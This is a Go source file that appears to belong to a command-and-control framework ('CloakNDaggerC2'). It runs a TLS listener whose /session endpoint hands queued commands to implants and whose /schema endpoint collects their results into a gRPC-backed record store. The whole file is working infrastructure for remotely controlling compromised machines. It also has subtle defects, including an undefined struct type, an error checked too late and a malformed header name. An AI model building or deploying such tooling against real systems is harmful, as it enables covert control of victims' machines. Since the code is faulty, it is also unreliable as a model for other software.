// This listener.go file will handle receiving RPC calls from the controller and subsequently will turn up or down listeners
package main

import (
	pb "CloakNDaggerC2/dagger/proto/daggerProto"
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

type impInfoStruct struct {
	UUID        string
	Whoami      string
	Signature   string
	Retrieved   int32
	Command     string
	LastCheckIn string
	Result      string
	GotIt       int32
}

func SetIt(result, uuid string) (int32, error) {
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		log.Fatalf("did not connect : %v", err)
	}

	defer conn.Close()

	c := pb.NewUpdateRecordClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	command := pb.NewHgetRecordClient(conn)

	ctx2, cancel2 := context.WithTimeout(context.Background(), time.Second)

	defer cancel2()

	preserved_field, err := command.Hget(ctx2, &pb.GetUUID{UUID: uuid})

	if err != nil {
		return 1, err
	}

	sig := pb.NewHgetRecordClient(conn)

	preserved_command := preserved_field.Command

	ctx3, cancel3 := context.WithTimeout(context.Background(), time.Second)

	defer cancel3()

	preserved_field, err = sig.Hget(ctx3, &pb.GetUUID{UUID: uuid})

	if err != nil {
		return 1, err
	}

	preserved_sig := preserved_field.Signature

	if err != nil {
		return 1, err
	}

	data := impInfo{
		// The issue I'm envisioning, I want to preserve the whoami and lastcheckin vals
		// In Python I was just running native DB queries and saving those vals to vars
		// With the API this will be more intensive and cumbersome
		// Right now we're ignoring the problem
		UUID: uuid, Whoami: "", Signature: preserved_sig, Retrieved: 0, Command: preserved_command, LastCheckIn: "", Result: result, GotIt: 0,
	}

	res, err := c.SendUpdate(ctx, &pb.UpdateObject{UUID: data.UUID, Whoami: data.Whoami, Signature: data.Signature,
		Retrieved: data.Retrieved, Command: data.Command, LastCheckIn: data.LastCheckIn, Result: data.Result,
		GotIt: data.GotIt})

	code := res.GetCode()

	if err != nil {
		return code, err
	}

	return code, nil

}

func UUID_info_func(UUID string) (impInfoStruct, error) {
	// Takes a UUID as a string
	// Returns either an empty struct and error or a full struct and no error
	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		return impInfoStruct{}, err
	}

	defer conn.Close()

	c := pb.NewHgetRecordClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)

	defer cancel()

	result := pb.NewHgetRecordClient(conn)

	ctx2, cancel2 := context.WithTimeout(context.Background(), time.Second)

	defer cancel2()

	preserved_field, err := result.Hget(ctx2, &pb.GetUUID{UUID: UUID})

	if err != nil {
		return impInfoStruct{}, err
	}
	preserved_result := preserved_field.Result

	res, err := c.Hget(ctx, &pb.GetUUID{UUID: UUID})

	if err != nil {
		return impInfoStruct{}, err
	}
	return impInfoStruct{UUID: UUID,
		Whoami:      res.Whoami,
		Signature:   res.Signature,
		Retrieved:   res.Retrieved,
		Command:     res.Command,
		LastCheckIn: res.LastCheckIn,
		Result:      preserved_result,
		GotIt:       res.GotIt,
	}, nil

}

func EnableServers(address, port string) (string, error) {
	fmt.Printf("Will serve listener on address %s and port %s \n", address, port)

	serverAddr := address + ":" + port
	certFile := "server.crt"
	keyFile := "server.key"

	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		fmt.Printf("Error: %e \n", err)
		os.Exit(1)
	}

	tlsConf := &tls.Config{Certificates: []tls.Certificate{cert}}

	listener, err := tls.Listen("tcp", serverAddr, tlsConf)

	if err != nil {
		fmt.Printf("Error: %e \n", err)
		os.Exit(1)
	}

	http.HandleFunc("/session", func(w http.ResponseWriter, r *http.Request) {
		// Session handles the implant requesting a command
		// This will return information
		// Need to use the UUID to get the command in the DB
		UUID := r.Header.Get("APPSESSIONID")
		//fmt.Printf("UUID: %s requesting command \n", UUID)

		//_, err := UUID_info_func(UUID)
		// We check if it exists and, if not, then we break out of the loop
		// err should be nil if the UUID exists
		//if err != nil {
		//	fmt.Println("No such UUID")
		//}

		res, err := UUID_info_func(UUID)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		//fmt.Printf("Signature: %s, Command %s \n", res.Signature, res.Command)

		w.Header().Set("Verifier:", res.Signature)
		fmt.Fprintln(w, res.Command)

	})

	http.HandleFunc("/schema", func(w http.ResponseWriter, r *http.Request) {
		// schema handles implants returning information
		// This will need to get information from the body of the request
		// That info is then fed into the API
		UUID := r.Header.Get("APPSESSIONID")
		Res := r.Header.Get("Res")
		//escaped := strconv.Quote(Res)
		//fmt.Printf("UUID: %s checking in with result: %s \n", UUID, escaped)

		code, err := SetIt(Res, UUID)
		if code != 0 || err != nil {
			fmt.Print(err)
			os.Exit(1)
		}

	})

	server := &http.Server{}

	// The goroutine here allows us to serve the listeners and then move back to the main program
	go func() {
		err = server.Serve(listener)
		if err != nil {
			fmt.Printf("Error: %e\n", err)
			os.Exit(1)
		}
	}()
	return "0", nil

}
